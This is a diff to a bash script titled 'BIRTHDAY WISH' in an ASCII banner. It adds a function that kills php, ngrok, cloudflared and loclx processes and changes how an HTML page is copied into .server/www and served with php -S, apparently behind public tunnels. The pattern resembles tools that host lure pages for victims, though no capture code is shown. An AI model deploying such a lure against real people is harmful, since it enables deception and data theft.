@@ -26,9 +26,29 @@ for pkg in "${pkgs[@]}"; do
 fi
 done
 
+kill_pid() {
+	check_PID="php ngrok cloudflared loclx"
+	for process in ${check_PID}; do
+		if [[ $(pidof ${process}) ]]; then # Check for Process
+			killall ${process} > /dev/null 2>&1 # Kill the Process
+		fi
+	done
+}
 
 banner() {
- echo ""
+ echo "${g}██████╗░██╗██████╗░████████╗██╗░░██╗██████╗░░█████╗░██╗░░░██╗
+██╔══██╗██║██╔══██╗╚══██╔══╝██║░░██║██╔══██╗██╔══██╗╚██╗░██╔╝
+██████╦╝██║██████╔╝░░░██║░░░███████║██║░░██║███████║░╚████╔╝░
+██╔══██╗██║██╔══██╗░░░██║░░░██╔══██║██║░░██║██╔══██║░░╚██╔╝░░
+██████╦╝██║██║░░██║░░░██║░░░██║░░██║██████╔╝██║░░██║░░░██║░░░
+╚═════╝░╚═╝╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝░░░╚═╝
+
+░██╗░░░░░░░██╗██╗░██████╗██╗░░██╗
+░██║░░██╗░░██║██║██╔════╝██║░░██║
+░╚██╗████╗██╔╝██║╚█████╗░███████║
+░░████╔═████║░██║░╚═══██╗██╔══██║   ${w}By RUR999+${g}
+░░╚██╔╝░╚██╔╝░██║██████╔╝██║░░██║   ${w}Github: DH-Alamin${g}
+░░░╚═╝░░░╚═╝░░╚═╝╚═════╝░╚═╝░░╚═╝${n}"
 }
 
 
@@ -115,6 +135,7 @@ start_cloudflared() {
 
 setup_site() {
  rm -rf index.html
+ rm -rf .server/www/index.html
  mv ${name} index.html
 	cp index.html .server/www
 	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
@@ -312,10 +333,11 @@ EOF
 
 }
 
-
+kill_pid
 banner
 ask
 dmake
+rm ${nam}.html
 mv def.html ${nam}.html
 name="${nam}.html"
 checkdir
